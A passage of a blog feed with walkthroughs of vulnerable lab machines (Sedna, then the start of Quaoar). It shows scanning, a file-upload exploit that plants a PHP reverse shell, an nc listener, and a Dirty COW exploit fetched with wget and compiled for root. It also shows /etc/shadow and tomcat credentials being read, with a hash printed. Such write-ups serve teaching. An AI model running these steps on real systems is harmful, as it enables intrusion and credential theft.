+ 7536 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-07-07 22:03:47 (GMT-6) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dirb http:&#x2F;&#x2F;10.37.129.7 -i

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Jul  7 22:05:03 2017
URL_BASE: http:&#x2F;&#x2F;10.37.129.7&#x2F;
WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt
OPTION: Using Case-Insensitive Searches

-----------------

GENERATED WORDS: 4456

---- Scanning URL: http:&#x2F;&#x2F;10.37.129.7&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;blocks&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;files&#x2F;
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;index.html (CODE:200|SIZE:101)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;modules&#x2F;
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;robots.txt (CODE:200|SIZE:36)
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;server-status (CODE:403|SIZE:291)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;themes&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;blocks&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;files&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;modules&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;core&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;fonts&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;helpers&#x2F;
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;index.html (CODE:200|SIZE:142)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;language&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;libraries&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;themes&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
(Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;core&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;core&#x2F;compat&#x2F;
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;core&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;fonts&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;fonts&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;helpers&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;helpers&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;language&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;language&#x2F;english&#x2F;
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;language&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;libraries&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;libraries&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;core&#x2F;compat&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;core&#x2F;compat&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;index.html (CODE:200|SIZE:142)
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;mssql&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;mysql&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;odbc&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;language&#x2F;english&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;language&#x2F;english&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;mssql&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;mssql&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;mysql&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;mysql&#x2F;index.html (CODE:200|SIZE:142)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;odbc&#x2F; ----
+ http:&#x2F;&#x2F;10.37.129.7&#x2F;system&#x2F;database&#x2F;drivers&#x2F;odbc&#x2F;index.html (CODE:200|SIZE:142)

-----------------
END_TIME: Fri Jul  7 22:05:18 2017
DOWNLOADED: 62384 - FOUND: 16

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After quite a bit of screwing around and running dirb&#x2F;nikto I figured out the server was running BuilderEngine 3.5, with a search on exploit-db I was able to find a file upload vulnerability: themes&#x2F;dashboard&#x2F;assets&#x2F;plugins&#x2F;jquery-file-upload&#x2F;server&#x2F;php&#x2F; and upload a php reverse shell, then:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sudo nc -vnlp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from 10.37.129.7 59854 received!
Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU&#x2F;Linux
 00:53:28 up 1 day,  1:59,  0 users,  load average: 0.00, 0.01, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
&#x2F;bin&#x2F;sh: 0: can&#x27;t access tty; job control turned off
$ export TERM=xterm
$ python -c &#x27;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#x27;
www-data@Sedna:&#x2F;$ ls
ls
bin   dev  home        lib     media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    proc  run   srv   tmp  var
www-data@Sedna:&#x2F;$ whoami
whoami
www-data
www-data@Sedna:&#x2F;$ uname -a
uname -a
Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU&#x2F;Linux
www-data@Sedna:&#x2F;$ cd &#x2F;var&#x2F;www
cd &#x2F;var&#x2F;www
www-data@Sedna:&#x2F;var&#x2F;www$ s
s
s: command not found
www-data@Sedna:&#x2F;var&#x2F;www$ ls
ls
flag.txt  html
www-data@Sedna:&#x2F;var&#x2F;www$ cat flag.txt
cat flag.txtbfbb7e6e6e88d9ae66848b9aeac6b289

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ cat &#x2F;etc&#x2F;passwd
root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:
syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
mysql:x:102:106:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
messagebus:x:103:108::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false
bind:x:104:115::&#x2F;var&#x2F;cache&#x2F;bind:&#x2F;bin&#x2F;false
postfix:x:105:116::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;bin&#x2F;false
dnsmasq:x:106:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false
dovecot:x:107:118:Dovecot mail server,,,:&#x2F;usr&#x2F;lib&#x2F;dovecot:&#x2F;bin&#x2F;false
dovenull:x:108:119:Dovecot login user,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
landscape:x:109:120::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false
sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
postgres:x:111:121:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash
avahi:x:112:122:Avahi mDNS daemon,,,:&#x2F;var&#x2F;run&#x2F;avahi-daemon:&#x2F;bin&#x2F;false
colord:x:113:124:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false
libvirt-qemu:x:114:107:Libvirt Qemu,,,:&#x2F;var&#x2F;lib&#x2F;libvirt:&#x2F;bin&#x2F;false
libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;dnsmasq:&#x2F;bin&#x2F;false
tomcat7:x:116:126::&#x2F;usr&#x2F;share&#x2F;tomcat7:&#x2F;bin&#x2F;false
crackmeforpoints:x:1000:1000::&#x2F;home&#x2F;crackmeforpoints:
statd:x:117:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;bin&#x2F;false
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;privesc&quot;&gt;PrivEsc&lt;&#x2F;h2&gt;
&lt;p&gt;I did a search on exploit-db and it looks like this might be a use case for dirty cow, however when trying to run the exploit it always seemed to throw a kernel error and made the machine unusable, at least with the the renditions I tried.  I went ahead and peeked at a walkthrough and saw chkrootkit.  My takeaway was a way to find chkrootkit on the file system if possible:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;find -type d -printf &#x27;%d\t%P\n&#x27; 2&gt;&amp;1 | sort -r -nk1 | cut -f2- | grep -i &#x27;chkrootkit&#x27; | grep -v &quot;find&quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After a lot a messing around I decided to try dirty cow again, after more research it seemed like a timing issue.  I was able to finally get the firefart variant (https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40839&#x2F;) to work.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget http:&#x2F;&#x2F;kalivm:8000&#x2F;firefart.c
gcc firefart.c -pthread -o firefart -lcrypt
.&#x2F;firefart firefart
ssh firefart@sednavm
pass: firefart
echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;dirty_writeback_centisecs
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now I had a root shell!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cd &#x2F;
find . -name &#x27;flag.txt&#x27;
&#x2F;root&#x2F;flag.txt
&#x2F;var&#x2F;www&#x2F;flag.txt
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;post-exploitation&quot;&gt;Post Exploitation&lt;&#x2F;h2&gt;
&lt;p&gt;Now for the post exploitation flags&lt;&#x2F;p&gt;
&lt;p&gt;I remember seeing tomcat running and messing with it early on, now that we have root it should be fairly easy to get in there&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;etc&#x2F;tomcat7&#x2F;tomcat-users.xml
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;xml&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;tomcat-users&gt;
    &lt;role rolename=&quot;manager-gui&quot;&#x2F;&gt;
    &lt;user username=&quot;tomcat&quot; password=&quot;submitthisforpoints&quot; roles=&quot;manager-gui&quot;&#x2F;&gt;
&lt;&#x2F;tomcat-users&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looking at &#x2F;etc&#x2F;passwd there appears to be an account to try and crack:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;etc&#x2F;passwd
firefart:fik57D3GJz&#x2F;tk:0:0:pwned:&#x2F;root:&#x2F;bin&#x2F;bash:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:
syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
mysql:x:102:106:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
messagebus:x:103:108::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false
bind:x:104:115::&#x2F;var&#x2F;cache&#x2F;bind:&#x2F;bin&#x2F;false
postfix:x:105:116::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;bin&#x2F;false
dnsmasq:x:106:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false
dovecot:x:107:118:Dovecot mail server,,,:&#x2F;usr&#x2F;lib&#x2F;dovecot:&#x2F;bin&#x2F;false
dovenull:x:108:119:Dovecot login user,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
landscape:x:109:120::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false
sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
postgres:x:111:121:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash
avahi:x:112:122:Avahi mDNS daemon,,,:&#x2F;var&#x2F;run&#x2F;avahi-daemon:&#x2F;bin&#x2F;false
colord:x:113:124:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false
libvirt-qemu:x:114:107:Libvirt Qemu,,,:&#x2F;var&#x2F;lib&#x2F;libvirt:&#x2F;bin&#x2F;false
libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;dnsmasq:&#x2F;bin&#x2F;false
tomcat7:x:116:126::&#x2F;usr&#x2F;share&#x2F;tomcat7:&#x2F;bin&#x2F;false
crackmeforpoints:x:1000:1000::&#x2F;home&#x2F;crackmeforpoints:
statd:x:117:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;bin&#x2F;false
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then to get the shadow for that user:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;etc&#x2F;shadow | grep -i &#x27;crackmeforpoints&#x27; | cut -d &#x27;:&#x27; -f -2
crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y&#x2F;1upG.54kSph&#x2F;HSP1LFcn4.2C11cF0R7QmojBqNy5&#x2F;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I didn&#x27;t get this cracked yet, maybe later...&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>hackfest2016-Quaroar</title>
		<published>2017-06-07T00:00:00+00:00</published>
		<updated>2017-06-07T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/hackfest-2016-quaroar/" type="text/html"/>
		<id>https://m4l1c3.github.io/hackfest-2016-quaroar/</id>
		<content type="html">&lt;h1 id=&quot;quaoar&quot;&gt;Quaoar&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@425a6cebc5e3:&#x2F;# nmap -T4 -A -sC -v -P 0-65535 192.168.171.128 -oA quaoar
Warning: The -P0 option is deprecated. Please use -Pn

Starting Nmap 7.40 ( https:&#x2F;&#x2F;nmap.org ) at 2017-06-08 05:58 UTC
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 05:58
Completed Parallel DNS resolution of 1 host. at 05:58, 0.08s elapsed
Initiating SYN Stealth Scan at 05:58
Scanning 192.168.171.128 [1000 ports]
Discovered open port 139&#x2F;tcp on 192.168.171.128
Discovered open port 445&#x2F;tcp on 192.168.171.128
Discovered open port 143&#x2F;tcp on 192.168.171.128
Discovered open port 995&#x2F;tcp on 192.168.171.128
Discovered open port 993&#x2F;tcp on 192.168.171.128
Discovered open port 80&#x2F;tcp on 192.168.171.128
Discovered open port 22&#x2F;tcp on 192.168.171.128
Discovered open port 53&#x2F;tcp on 192.168.171.128
Discovered open port 110&#x2F;tcp on 192.168.171.128
Completed SYN Stealth Scan at 05:58, 0.18s elapsed (1000 total ports)
Initiating Service scan at 05:58
Scanning 9 services on 192.168.171.128
Completed Service scan at 05:58, 11.02s elapsed (9 services on 1 host)
Initiating OS detection (try #1) against 192.168.171.128
Retrying OS detection (try #2) against 192.168.171.128
Initiating Traceroute at 05:58
Completed Traceroute at 05:58, 0.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 05:58
Completed Parallel DNS resolution of 2 hosts. at 05:58, 0.08s elapsed
NSE: Script scanning 192.168.171.128.
Initiating NSE at 05:58
Completed NSE at 05:58, 10.65s elapsed
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Nmap scan report for 192.168.171.128
Host is up (0.00079s latency).
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22&#x2F;tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53&#x2F;tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80&#x2F;tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache&#x2F;2.2.22 (Ubuntu)
|_http-title: Site doesn&#x27;t have a title (text&#x2F;html).
110&#x2F;tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA UIDL STLS SASL TOP RESP-CODES
| ssl-cert: Subject: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:46+00:00; 0s from scanner time.
139&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143&#x2F;tcp open  imap        Dovecot imapd
|_imap-capabilities: OK LOGIN-REFERRALS LOGINDISABLEDA0001 IDLE capabilities SASL-IR LITERAL+ post-login listed IMAP4rev1 ENABLE have Pre-login ID more STARTTLS
| ssl-cert: Subject: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:46+00:00; 0s from scanner time.
445&#x2F;tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993&#x2F;tcp open  ssl&#x2F;imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS Pre-login IDLE listed SASL-IR LITERAL+ post-login AUTH=PLAINA0001 IMAP4rev1 ENABLE have capabilities ID more OK
| ssl-cert: Subject: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:45+00:00; 0s from scanner time.
995&#x2F;tcp open  ssl&#x2F;pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA UIDL USER SASL(PLAIN) TOP RESP-CODES
| ssl-cert: Subject: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Issuer: commonName=ubuntu&#x2F;organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-06-08T05:58:45+00:00; 0s from scanner time.
Device type: general purpose
Running (JUST GUESSING): Apple Mac OS X 10.7.X (85%), FreeBSD 8.X (85%)
OS CPE: cpe:&#x2F;o:apple:mac_os_x:10.7.4 cpe:&#x2F;o:freebsd:freebsd:8.0
Aggressive OS guesses: Apple Mac OS X 10.7.4 (Lion) (Darwin 11.4.0) (85%), FreeBSD 8.0-CURRENT (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=136 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   QUAOAR&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   QUAOAR&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   QUAOAR&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
